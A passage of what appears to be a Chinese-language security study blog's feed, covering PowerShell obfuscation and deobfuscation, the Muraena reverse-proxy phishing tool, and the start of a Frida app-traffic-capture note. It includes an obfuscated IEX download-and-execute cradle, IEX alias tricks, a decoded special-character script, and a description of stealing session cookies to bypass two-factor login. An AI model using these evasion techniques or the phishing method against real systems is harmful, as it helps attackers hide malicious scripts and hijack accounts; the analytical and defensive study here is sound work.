Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$secCmd = ConvertTo-SecureString $cmd -AsPlainText -Force</span><br><span class="line">$secCmdPlaintext = $secCmd | CovertFrom-SecureString -Key (1..16)</span><br><span class="line">$secCmd = $secCmdPlaintext | ConvertTo-SecureString -Key (1..16)</span><br><span class="line">([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX</span><br></pre></td></tr></table></figure><h3 id="IEX等命令的替代"><a href="#IEX等命令的替代" class="headerlink" title="IEX等命令的替代"></a>IEX等命令的替代</h3><ul><li>IEX别名：<code>Invoke-Expression</code>、<code>&amp;(GAL I*X)</code>。</li><li>通过command的方式来进行编码：<code>Command I*e-E*</code>。</li><li>使用环境变量：<code>$ExecutionContext.InvokeCommand.GetCmdlets(&#39;I*e-E*&#39;)</code>。</li><li>其他选项/命令的别名（替代）如下所示：</li></ul><p><img src="/images/ps-obfuscation/image-20231016141807602.png" alt="image-20231016141807602" style="zoom:67%;" /></p><h3 id="特殊字符混淆"><a href="#特殊字符混淆" class="headerlink" title="特殊字符混淆"></a>特殊字符混淆</h3><p>&emsp;可以使用特殊字符来定义变量，相关的项目名为<code>Invoke-Obfuscation</code>。给出如下脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;$&#123;;<span class="regexp">/=&#125;  =$&#123;$!-&#125;;$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;$&#123;/</span>&#125;  =++$&#123;$!-&#125;;$&#123;(&#125;  =  ++  $&#123;$!-&#125;;$&#123;#&#125;=  ++$&#123;$!-&#125;;$&#123;.&#125;  =++  $&#123;$!-&#125;  ;$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;$&#123;!&#125;  =++$&#123;$!-&#125;  ;$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;$&#123;@&#125;=++$&#123;$!-&#125;  ;$&#123;[$ &#125;  =<span class="string">&quot;[&quot;</span>+  <span class="string">&quot;$(  @&#123;&#125;  )&quot;</span>[  $&#123;!&#125;]  +<span class="string">&quot;$(@&#123;&#125;)&quot;</span>[<span class="string">&quot;$&#123;-&#125;&quot;</span>+<span class="string">&quot;$&#123;@&#125;&quot;</span>]+<span class="string">&quot;$(@&#123;  &#125;)  &quot;</span>[<span class="string">&quot;$&#123;/&#125;&quot;</span>  +<span class="string">&quot;$&#123;;/=&#125;&quot;</span>  ]+<span class="string">&quot;$?&quot;</span>[$&#123;-&#125;  ]+<span class="string">&quot;]&quot;</span>;$&#123;$!-&#125;=<span class="string">&quot;&quot;</span>.(<span class="string">&quot;$(@&#123;&#125;  )  &quot;</span>[  <span class="string">&quot;$&#123;-&#125;$&#123;#&#125;&quot;</span>]  +  <span class="string">&quot;$(  @&#123;  &#125;  )  &quot;</span>[<span class="string">&quot;$&#123;-&#125;$&#123;)@&#125;&quot;</span>]+  <span class="string">&quot;$(  @&#123;&#125;)&quot;</span>[$&#123;;<span class="regexp">/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span></span><br></pre></td></tr></table></figure><p>（1）按<code>;</code>隔开脚本，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;</span><br><span class="line">$&#123;;/=&#125;  =$&#123;$!-&#125;;</span><br><span class="line">$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;/&#125;  =++$&#123;$!-&#125;;</span><br><span class="line">$&#123;(&#125;  =  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;#&#125;=  ++$&#123;$!-&#125;;</span><br><span class="line">$&#123;.&#125;  =++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;!&#125;  =++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;@&#125;=++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;[$ &#125;  =&quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;;</span><br><span class="line">$&#123;$!-&#125;=&quot;&quot;.(&quot;$(@&#123;&#125;  )  &quot;[  &quot;$&#123;-&#125;$&#123;#&#125;&quot;]  +  &quot;$(  @&#123;  &#125;  )  &quot;[&quot;$&#123;-&#125;$&#123;)@&#125;&quot;]+  &quot;$(  @&#123;&#125;)&quot;[$&#123;;/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);</span><br><span class="line">$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;</span><br><span class="line">.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span><br></pre></td></tr></table></figure><p>（2）执行完前12行后，有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125; = 8</span><br><span class="line">$&#123;;/=&#125; = 0</span><br><span class="line">$&#123;-&#125;   = 1</span><br><span class="line">$&#123;/&#125;   = 2</span><br><span class="line">$&#123;(&#125;   = 3</span><br><span class="line">$&#123;#&#125;   = 4</span><br><span class="line">$&#123;.&#125;   = 5</span><br><span class="line">$&#123;)@&#125;  = 6</span><br><span class="line">$&#123;!&#125;   = 7</span><br><span class="line">$&#123;;~+&#125; = 8</span><br><span class="line">$&#123;@&#125;   = 9</span><br></pre></td></tr></table></figure><p>（3）由于<code>&quot;$(@&#123;&#125;)&quot;</code>返回<code>System.Collections.Hashtable</code>，<code>&quot;$?&quot;</code>返回<code>True</code>，因此有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;[$ &#125; = &quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;</span><br><span class="line">       = &quot;[&quot; + &quot;System.Collections.Hashtable&quot;[7] + &quot;System.Collections.Hashtable&quot;[19] + &quot;System.Collections.Hashtable&quot;[20] + &quot;True&quot;[1] + &quot;]&quot;</span><br><span class="line">       = &quot;[Char]&quot;</span><br></pre></td></tr></table></figure><p>&emsp;类似的分析，得到<code>$&#123;$!-&#125;=iex</code>，最后执行的指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.iex(mkdir onlyf8 | iex)</span><br></pre></td></tr></table></figure><p>注：BlobRunner可以调试shellcode。</p><h2 id="powershell-反混淆"><a href="#powershell-反混淆" class="headerlink" title="powershell 反混淆"></a>powershell 反混淆</h2><h4 id="基于AST和语义保持的反混淆（Invoke-Deobfuscation-工具）"><a href="#基于AST和语义保持的反混淆（Invoke-Deobfuscation-工具）" class="headerlink" title="基于AST和语义保持的反混淆（Invoke-Deobfuscation 工具）"></a>基于AST和语义保持的反混淆（Invoke-Deobfuscation 工具）</h4><p>&emsp;现有方法反混淆主要分为三个步骤，即<code>识别混淆脚本片段、还原混淆和重构脚本</code>。</p><p>&emsp;在<code>识别混淆脚本片段</code>上，PowerDecode设计了一组正则表达式来匹配，但它们经常识别出带有无效语法的错误脚本片段；李振源等人使用基于机器学习的分类器来识别混淆脚本片段，其使用抽象语法树（AST）节点的特征来识别具有有效语法的混淆片段，这在很大程度上取决于训练数据的质量。</p><p>&emsp;在<code>还原混淆</code>方面，有3种方法：<code>预定义还原规则、函数重载和直接执行</code>。预定义的还原规则按照混淆的类型模拟还原过程，对于一些特定的混淆技术非常有效，但经常因忽略混淆脚本片段的语法而得到错误的结果。函数重载用于处理特定函数的混淆参数，如Invoke-Expression，它拦截目标函数并捕获它们经过多次反混淆的运行时参数。直接执行是另一种处理混淆脚本片段的方法，但是，由于缺少上下文，该方法无法正确处理带变量的混淆片段。</p><p>&emsp;现有的<code>脚本重构方法</code>都是上下文无关的，因此它们最终的反混淆脚本可能不符合语法或在语义上不一致。它们替换脚本中所有相同的混淆片段，这会忽略这些片段的不同上下文，并可能改变脚本的语义。</p><p>&emsp;Invoke-Deobfuscation做了如下几件事：（1）根据脚本 AST 的标记和可还原节点识别混淆的脚本片段；（2）跟踪变量以获取混淆脚本片段的上下文；（3）基于AST的后序遍历重构脚本。</p><p>&emsp;Invoke-Deobfuscation的反混淆过程可以分为三个阶段：Token解析、基于AST的变量跟踪和还原、重命名和重排版。</p><h5 id="Token解析"><a href="#Token解析" class="headerlink" title="Token解析"></a>Token解析</h5><p>&emsp;基于Microsoft的官方库<code>System.Management.Automation.PSParser</code>对ps脚本进行标记化，Token包含文本内容、起始偏移、长度等许多属性。之后，利用Token的属性来还原原始Token并将它们组合起来形成反混淆脚本。如下图所示：</p><p><img src="/images/ps-obfuscation/image-20231015184907321.png" alt="image-20231015184907321" style="zoom:67%;" /></p><p>&emsp;如果一个Token的类型是命令，它的内容是一个别名，如上图中的命令IeX，将用全称Invoke-Expression替换它。可以在Token级别处理其他混淆，例如随机大小写。处理完一个混淆的Token后，我们将在脚本中将其替换为它的还原结果。逆序处理可以<code>识别未处理的Token而不需要重新解析新产生的脚本</code>。</p><h5 id="基于AST的还原"><a href="#基于AST的还原" class="headerlink" title="基于AST的还原"></a>基于AST的还原</h5><p>&emsp;混淆脚本包括包括混淆数据及其还原算法。反混淆的关键是<code>在混淆脚本中识别这些可还原的片段</code>。</p><p>（1）识别可还原的片段</p><p>&emsp;<code>使用 PowerShell AST 上特定类型节点的内容来识别可还原的脚本片段</code>。首先，PowerShell脚本的AST各节点内容语法有效，包含可还原的脚本片段。其次，通过执行可还原的片段来获得原始片段。例如，”he”+”llo”可以执行得到”hello”。因此，我们对PowerShell AST中的所有节点类型进行分析，找出其内容在执行后往往能得到字符串形式结果的节点类型。我们称这些类型的节点为可还原节点，包括PipelineAst、UnaryExpressionAst、BinaryExpressionAst、ConvertExpressionAst、InvokeMemberExpressionAst和SubExpressionAst 。最后，<code>可还原节点的内容提取为可还原片段</code>。</p><p>（2）基于调用的还原</p><p>&emsp;<code>通过Invoke函数执行可还原的脚本片段以获得它们的还原结果</code>。可还原的脚本片段可能包含与还原过程无关的命令，例如Restart-Computer、Start-Sleep等。因此，创建这些命令的黑名单以加速反混淆。</p><p>（3）变量追踪</p><p>&emsp;由于<code>缺少上下文</code>，无法直接执行包含变量的可还原片段来获得正确的还原结果，因此，<code>使用符号表来记录脚本中出现的变量的范围和值</code>。变量分为局部变量、全局变量和环境变量三种类型。后序遍历AST，记录下当前访问节点的作用域。只有在访问NamedblockAst、IfStatementAst、WhileStatementAst、ForStatementAst、ForEachStatementAst和StatementBlockAst六种节点时，当前节点作用域的深度将变化。</p><p>&emsp;通过执行变量的赋值表达式将变量的值记录在符号表中。基于 AssignmentStatement 节点，可以识别变量及其赋值表达式。</p><p>（4）Invoke-Expression 和 PowerShell</p><p>&emsp;混淆脚本通常包含<code>多层混淆</code>，其典型特征是包含Invoke-Expression cmdlet或PowerShell。Invoke-Expression和PowerShell都可以将它们的字符串参数作为脚本运行。攻击者经常使用不同的方法来混淆这些命令。例如，混淆片段<code>.($pshome[4]+$pshome[30]+&quot;x&quot;)</code>等同于Invoke-Expression，使用变量追踪可以得到还原结果<code>.(&quot;iex&quot;)</code>，这是Invoke-Expression的常见格式。Invoke-Expression的其他常见格式包括<code>iex</code>、<code>&quot;xxx&quot;|iex</code>和<code>&amp;&quot;iex&quot;</code>。</p><p>&emsp;PowerShell可以使用参数<code>-EncodedCommand</code>执行Base64编码的命令。由于PowerShell的<code>自动补全和大小写不敏感</code>，该参数可以用于多种格式，如-e、-eNc等。我们将参数转换为小写并使用<code>&quot;-encodedcommand&quot;.StartsWith($param)</code>判断参数是否为<code>-EncodedCommand</code>。</p><p>（5）脚本重构</p><p>&emsp;基于 AST 的<code>后序遍历</code>重构反混淆脚本，当访问一个节点时，我们首先使用它的子节点的内容来更新它的内容，以确保在访问它时，它的所有子节点都已经处理完毕。如果其内容被混淆，我们将用其还原结果替换它。最终，当我们访问 AST 的根节点时，将获得整个反混淆脚本。</p><h5 id="重命名和重排版"><a href="#重命名和重排版" class="headerlink" title="重命名和重排版"></a>重命名和重排版</h5><p>&emsp;随机命名变量和函数的重命名以及代码的重排版可以使脚本更易于分析人员分析。使用<code>统计分析</code>来确定变量名称函数名称是否是随机的，并用预定义的规则替换随机名称。</p><p>（1）将脚本中所有唯一的变量名和函数名提取出来，看成是一个完整的字符串。根据元音和特殊字符的比例来判断字符串是否随机。Hayden指出在通用美式英语中元音的比例约为37.4%，因此当英文字符中元音的比例不在32%和42%之间时，我们假设字符串是随机的。</p><p>（2）对于非英文字母的特殊字符，我们将来自GitHub的4234个正常PowerShell脚本与我们收集到的恶意脚本进行统计对比，发现正常脚本中英文字母的比例大于70%，而非英文字母的特殊字符比例小于 2%。因此，当一个字符串的英文字母比例小于10% 时，我们假设该字符串是随机的。</p><p>（3）使用<code>var_&#123;num&#125;</code>和<code>func_&#123;num&#125;</code>替换随机变量和函数名称，新名称取决于该变量或函数在混淆脚本片段出现的顺序。</p><h4 id="日志去混淆"><a href="#日志去混淆" class="headerlink" title="日志去混淆"></a>日志去混淆</h4><p>&emsp;powershell日志记录了执行ps指令的过程，因此可以通过日志查看真实执行的ps指令。</p><h4 id="PowerDrive工具-去混淆原理"><a href="#PowerDrive工具-去混淆原理" class="headerlink" title="PowerDrive工具-去混淆原理"></a>PowerDrive工具-去混淆原理</h4><p><img src="/images/ps-obfuscation/image-20231016135538877.png" alt="image-20231016135538877" style="zoom:67%;" /></p><p>&emsp;PowerDrive由<code>预处理模块、去混淆模块、反调试检测模块、执行脚本模块</code>4个模块组成。各个模块功能为：</p><ul><li>预处理模块：将多行转换成一行，去除不可见的ASCII字符，检查符号是否正确。</li><li>去混淆模块：（1）使用正则来匹配需要重新排序的字符串，并进行重新排序。（2）使用Invoke-Expression将混淆后的字符串作为命令运行，字符串就会被自动去混淆。</li><li>反调试检测模块：检测sleep指令、检测恶意软件的输出是否被重定向到空输出、检测死循环、检测是否使用try-catch模块来引发异常。</li><li>执行脚本模块：主要是检索后续阶段的有效载荷，钩取Invoke-WebRequest、 Invoke-Rest和New-Object来提取脚本关联的其他可执行文件。</li></ul><h4 id="机器学习去混淆"><a href="#机器学习去混淆" class="headerlink" title="机器学习去混淆"></a>机器学习去混淆</h4><p>&emsp;构建分类器（File Status Classifier）来确定样本是否被编码、混淆或是明文。然后循环应用解码和反混淆逻辑，并且检查每次的输出以确定是否需要下一次操作。最后，用cleanup神经网络来修正无法处理的特殊位。如下所示：</p><p><img src="/images/ps-obfuscation/image-20231016151347423.png" alt="image-20231016151347423" style="zoom:67%;" /></p><h5 id="构建-Status-Classifier"><a href="#构建-Status-Classifier" class="headerlink" title="构建 Status Classifier"></a>构建 Status Classifier</h5><p>&emsp;其步骤为：（1）收集含有标签的样本（比如，十六进制编码、混淆、明文等）；（2）对样本生成数字特征；（3）进行训练。</p><p>&emsp;针对（1），通过爬虫抓取github ps样本，并生成混淆与编码样本。</p><p>&emsp;针对（2），以样本为输入，使用LSTM，生成样本数字特征。</p><h5 id="构建-De-encoder"><a href="#构建-De-encoder" class="headerlink" title="构建 De-encoder"></a>构建 De-encoder</h5><p>&emsp;使用正则表达式来进行模式匹配，从而解码。</p><h5 id="构建-Deobfuscator"><a href="#构建-Deobfuscator" class="headerlink" title="构建 Deobfuscator"></a>构建 Deobfuscator</h5><p>&emsp;大部分可以通过简单逻辑来处理：连接字符串，移除反引号，替换变量等。</p><p>&emsp;对于基于<code>-f</code>的字符串进行重新排序，步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 找出-f或-F；</span><br><span class="line">2. 找出所有-f之前的&#123;[0-9]+&#125;类型的占位符</span><br><span class="line">3. 找出所有-f之后的所有的字符串和有效的非字符串值</span><br><span class="line">4. 用值替换占位符</span><br><span class="line">5. 在同一行进行多次循环</span><br></pre></td></tr></table></figure><h5 id="构建-Cleanup-Network"><a href="#构建-Cleanup-Network" class="headerlink" title="构建 Cleanup Network"></a>构建 Cleanup Network</h5><p>&emsp;被Cleanup Network处理前，可能包含很多令人费解的字符串，例如<code>MOdULEDiRectORy</code>。使用Seq2Seq（翻译中经常用到），针对减少错误的预测结果，步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 找出混淆后脚本和非混淆脚本中对应的单词</span><br><span class="line">2. 找出可能被混淆的变量和关键词</span><br><span class="line">3. 用混淆后脚本中单词作为输入，非非混淆脚本中单词作为期望输出</span><br><span class="line">4. 用之前的预测和新的输入数据预测下一个字符</span><br></pre></td></tr></table></figure><h4 id="其他工具去混淆"><a href="#其他工具去混淆" class="headerlink" title="其他工具去混淆"></a>其他工具去混淆</h4><p>（1）静态规则检测：Flerken</p><p>（2）混淆还原：powershellprofiler</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao">https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao</a></p><p>[2] <a href="https://onlyf8.com//powershell-obfuscationEN">https://onlyf8.com//powershell-obfuscationEN</a></p><p>[3] <a href="https://www.secrss.com/articles/52662">https://www.secrss.com/articles/52662</a></p><p>[4] <a href="https://www.ctfiot.com/41643.html">https://www.ctfiot.com/41643.html</a></p><p>[5] <a href="https://www.secrss.com/articles/20119">https://www.secrss.com/articles/20119</a></p><p>[6] <a href="https://xz.aliyun.com/t/2923">https://xz.aliyun.com/t/2923</a></p><p>[7] <a href="https://cloud.tencent.com/developer/article/1639161">https://cloud.tencent.com/developer/article/1639161</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;powershell混淆与反混&quot;&gt;&lt;a href=&quot;#powershell混淆与反混&quot; class=&quot;headerlink&quot; title=&quot;powershell混淆与反混&quot;&gt;&lt;/a&gt;powershell混淆与反混&lt;/h1&gt;&lt;p&gt;&amp;emsp;powershell是基于&lt;code&gt;.net&lt;/code&gt;开发的自动化语言。利用ps可以进行很多攻击，例如，利用&lt;code&gt;DownloadString&lt;/code&gt;，能够在设备上运行命令/外壳代码/可执行文件，而&lt;code&gt;无需对设备磁盘进行任何写入操作&lt;/code&gt;。或者使用&lt;code&gt;Marshall&lt;/code&gt;类，外壳代码可以在内存中解密，并且可以在&lt;code&gt;不写入磁盘的情况下执行&lt;/code&gt;。ps提供了对机器内核的访问，包括对Windows API的无限制访问。因此，越来越多的网络犯罪分子将PowerShell加入了他们的攻击武器库。&lt;/p&gt;</summary>
    
    
    
    <category term="study-notes" scheme="https://wd-2711.tech/categories/study-notes/"/>
    
    
  </entry>
  
  <entry>
    <title>muraen-source-code-reading</title>
    <link href="https://wd-2711.tech/2023/10/13/muraen-source-code-reading/"/>
    <id>https://wd-2711.tech/2023/10/13/muraen-source-code-reading/</id>
    <published>2023-10-13T10:27:13.000Z</published>
    <updated>2023-10-18T06:14:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="muraen钓鱼工具-源码分析"><a href="#muraen钓鱼工具-源码分析" class="headerlink" title="muraen钓鱼工具-源码分析"></a>muraen钓鱼工具-源码分析</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>&emsp;传统网络钓鱼攻击是由虚假登录页面组成的，这些页面在攻击者控制的web服务器上，并由与目标网站名称相似的自定义域名提供服务。然而，对于2FA（双因素认证）而言，即使攻击者拿到了<code>用户名密码</code>，也无法登录网站，因为没有与合法网站进行交互来触发生成<code>cookie</code>。此时，攻击者需要让钓鱼网站充当代理，代表受害者转发请求到合法网站，并实时回传（中间人攻击）。</p><span id="more"></span><p>&emsp;识别中间人攻击的方式有很多，例如子资源完整性 (Subresource Integrity，SRI) 和内容安全策略 (Content Security Policy，CSP) 等技术（<code>为什么能识别？还不明白</code>）。为了绕过这些防御措施，Muraena应运而生。</p><h2 id="Muraena的功能"><a href="#Muraena的功能" class="headerlink" title="Muraena的功能"></a>Muraena的功能</h2><p>&emsp;一旦部署完成，攻击者就可以配置他们的钓鱼域名，并为其获得合法的证书（通过非营利性的Let’s Encrypt证书颁发机构）。该工具包含<code>充当反向代理的小型web服务器</code>和<code>爬虫程序</code>。爬虫程序可以<code>自动确定从合法网站代理哪些资源</code>。小型web服务器在传递来自受害者的请求之前重写这些请求。爬虫程序会自动生成一个JSON配置文件，然后可以手动修改该文件来绕过更复杂网站上的各种防御机制。</p><p>&emsp;一旦受害者登陆一个由Muraena提供支持的钓鱼网站，那么攻击过程如下所示：</p><p>（1）网站会要求用户输入他们的2FA验证码（用户名密码）。当他们提供验证码并完成身份验证之后，代理会窃取会话cookie。cookie通常由浏览器存储在一个文件中，并在后续请求中提供服务。</p><p>（2）Muraena自动将收集到的会话cookie传送给NecroBrowser，而NecroBrowser可以立即滥用cookie。<br>NecroBrowser是一个可以通过API进行控制的微服务，进行配置以后可在Docker容器内运行的Chromium实例执行操作。攻击者可以同时生成数十个容器，每个容器都有一个窃取的cookie。</p><h2 id="源码阅读笔记"><a href="#源码阅读笔记" class="headerlink" title="源码阅读笔记"></a>源码阅读笔记</h2><p>&emsp;注：没有实际跑过，看了四五天，头大，越看越不知道是干啥的。笔记以注释形式存在。</p><p>&emsp;链接：<a href="https://github.com/WD-2711/muraena">https://github.com/WD-2711/muraena</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;muraen钓鱼工具-源码分析&quot;&gt;&lt;a href=&quot;#muraen钓鱼工具-源码分析&quot; class=&quot;headerlink&quot; title=&quot;muraen钓鱼工具-源码分析&quot;&gt;&lt;/a&gt;muraen钓鱼工具-源码分析&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;&amp;emsp;传统网络钓鱼攻击是由虚假登录页面组成的，这些页面在攻击者控制的web服务器上，并由与目标网站名称相似的自定义域名提供服务。然而，对于2FA（双因素认证）而言，即使攻击者拿到了&lt;code&gt;用户名密码&lt;/code&gt;，也无法登录网站，因为没有与合法网站进行交互来触发生成&lt;code&gt;cookie&lt;/code&gt;。此时，攻击者需要让钓鱼网站充当代理，代表受害者转发请求到合法网站，并实时回传（中间人攻击）。&lt;/p&gt;</summary>
    
    
    
    <category term="go" scheme="https://wd-2711.tech/categories/go/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-reverse-analysis-2</title>
    <link href="https://wd-2711.tech/2023/10/09/frida-reverse-analysis-2/"/>
    <id>https://wd-2711.tech/2023/10/09/frida-reverse-analysis-2/</id>
    <published>2023-10-09T10:34:44.000Z</published>
    <updated>2023-11-13T14:15:30.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida逆向与协议分析-2"><a href="#Frida逆向与协议分析-2" class="headerlink" title="Frida逆向与协议分析-2"></a>Frida逆向与协议分析-2</h1><p>&emsp;frida逆向与协议分析第二部分。</p><span id="more"></span><h2 id="0x03-Frida逆向之违法App协议分析与取证实战"><a href="#0x03-Frida逆向之违法App协议分析与取证实战" class="headerlink" title="0x03 Frida逆向之违法App协议分析与取证实战"></a>0x03 Frida逆向之违法App协议分析与取证实战</h2><p>&emsp;之前介绍了frida定位关键类的两种方式：基于trace（objection、Zentracer）、基于内存（Java.choose寻找实例）。本章以两个违法样本为例，对app关键协议进行分析，从而巩固之前的知识。</p><h3 id="加固app协议分析"><a href="#加固app协议分析" class="headerlink" title="加固app协议分析"></a>加固app协议分析</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>&emsp;抓包往往可以<strong>快速定位关键接口函数的位置</strong>。</p><p>&emsp;抓包原理：在手机上设置代理，将手机流量数据转发到计算机的代理软件后再完成上网，这样就可以再计算机上监听手机上的流量数据。由于中间人抓包无法应对app使用Https等加密协议进行通信的情况，因此需要<strong>将代理软件的证书导入手机系统并添加到证书信任列表中</strong>。如果app不信任用户添加到系统中的证书，那么需要<strong>将证书从用户信任去移动到系统信任列表中</strong>。</p><p>&emsp;代理方式有两种：</p><p>（1）wifi代理（应用层），如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231009213402929.png" alt="image-20231009213402929" style="zoom:67%;" /></p><p>&emsp;这种方式有两个弊端：（a）无法处理非http通信，例如websocket。（b）容易被app检测到，相关代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(&quot;http.proxyHost&quot;)</span><br></pre></td></tr></table></figure><p>（2）vpn代理（更加推荐），相当于虚拟新网卡并修改手机路由表，工具为postern（注意要匹配所有地址）。</p><p><img src="/images/frida-reverse-analysis-2/image-20231009230301580.png" alt="image-20231009230301580" style="zoom:67%;" /></p><p>&emsp;linux中间人中安装charles，并设置代理：</p><p><img src="/images/frida-reverse-analysis-2/image-20231009231938941.png" alt="image-20231009231938941" 